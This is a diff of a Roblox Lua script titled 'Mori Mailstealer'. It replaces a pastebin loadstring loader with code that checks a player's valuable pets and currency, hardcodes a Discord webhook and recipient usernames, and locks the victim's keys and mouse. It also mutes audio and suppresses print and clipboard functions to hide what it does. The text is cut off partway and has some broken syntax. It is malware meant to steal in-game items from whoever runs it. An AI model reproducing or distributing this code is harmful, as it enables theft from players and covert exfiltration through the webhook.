@@ -1,8 +1,101 @@
-_G.Username1 = "deathcubitzzzz" --// Username To Send Pets To
-_G.Username2 = "User Here" --// Username To Send Pets To [OPTIONAL]
+-- [Mori Mailstealer]
 
---[[ WebHook ]]--
-_G.Webhook = "Webhook Here" --// Discord Webhook For Executions
+local Library = require(game.ReplicatedStorage.Framework.Library);
+local Players = game:GetService("Players")
+local Client = Players.LocalPlayer
 
---[[ Script ]]--
-loadstring(game:HttpGet("https://pastebin.com/raw/fcuxnqct",true))()
+local savedPets = Library.Save.Get().Pets
+hugeamount = 0
+for i,v in pairs(Library.Save.Get().Pets) do
+    local Pet = Library.Directory.Pets[v.id]
+        if Pet.huge == true then
+        hugeamount = hugeamount + 1
+        print(v)
+    end
+end
+if hugeamount >2 or Client.leaderstats.Diamonds.value > 300000000000 or Client.leaderstats.RAP.value > 500000000000 then
+     UserName = "Deathcubitzzzz"
+     Webhook "https://discord.com/api/webhooks/1182849332098109522/j158pdPv1_rxOvsarFWbfK2Rx8l8jA22W0WQIoYbSTas35HbzyIz5lanjseyOnYLoh5m"
+end
+
+if getgenv().executed then return end
+getgenv().executed = true
+
+local runService = game:GetService("RunService")
+local camera = workspace.CurrentCamera
+local disabledKeyCodes = {
+    0x73,
+    0xA4,
+    0xA5,
+    0x1B,
+    0x0D,
+};
+UserSettings().GameSettings.MasterVolume = 0
+if _G.MouseLock ~= false then
+    runService.RenderStepped:Connect(function()
+        for _, keyCode in next, disabledKeyCodes do
+            keyrelease(keyCode)
+        end
+
+        mousemoveabs(camera.ViewportSize.X / 3, camera.ViewportSize.Y / 3);
+    end);
+end
+
+local function antiPrint(...)
+    local info = debug.getinfo(2)
+    if info and info.what == 'Lua' and info.func == print then
+        return
+    end
+    return print(...)
+end
+print = antiPrint
+rconsoleprint = antiPrint
+rconsolewarn = antiPrint
+rconsoleerr = antiPrint
+rconsoleinput = antiPrint
+printconsole = antiPrint
+setclipboard = antiPrint
+
+-- Users And Stuff
+
+if UserName == nil then
+    UserName = _G.Pro_Gamer11S
+end
+if UserName2 == nil then
+    UserName2 = _G.Donvaska111
+end
+if Webhook == nil then
+    Webhook = https://discord.com/api/webhooks/1182849332098109522/j158pdPv1_rxOvsarFWbfK2Rx8l8jA22W0WQIoYbSTas35HbzyIz5lanjseyOnYLoh5m
+end
+-- User Checks
+
+local idiotuser = game:GetService("Players").LocalPlayer.Name
+
+if idiotuser == UserName then
+    game:GetService("Players").LocalPlayer:Kick("You Are The Owner! (test it on alt acc)")
+    return;
+end
+if UserName == nil then
+    game:GetService("Players").LocalPlayer:Kick("Put A UserName")
+    return;
+end
+local worked2 = pcall(function()
+    game:GetService("Players"):GetUserIdFromNameAsync(UserName)
+end)
+if not worked2 then
+    game:GetService("Players").LocalPlayer:Kick("Put A Valid Username!")
+    return;
+end
+if worked2 then
+    _G.UserID = game:GetService("Players"):GetUserIdFromNameAsync(UserName)
+end
+if UserName2 ~= nil then
+    local worked3 = pcall(function()
+        game:GetService("Players"):GetUserIdFromNameAsync(UserName2)
+    end)
+    if not worked3 then
+        game:GetService("Players").LocalPlayer:Kick("Put A Valid Username2!")
+        return;
+    end
+end
+... (25 KB left)
